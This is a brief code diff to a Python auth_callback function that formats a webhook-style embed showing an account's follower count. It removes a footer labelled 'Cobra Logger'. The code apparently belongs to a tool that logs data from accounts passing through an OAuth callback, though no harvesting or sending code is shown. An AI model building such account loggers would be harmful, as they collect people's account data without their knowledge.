@@ -139,9 +139,8 @@ def auth_callback():
                     "name": "👥 Followers",
                     "value": f"{followers_count}",
                     "inline": False
-                },
-            ],
-            "footer": {"text": "Cobra Logger"}
+                }
+            ]
         }
         
         payload = {
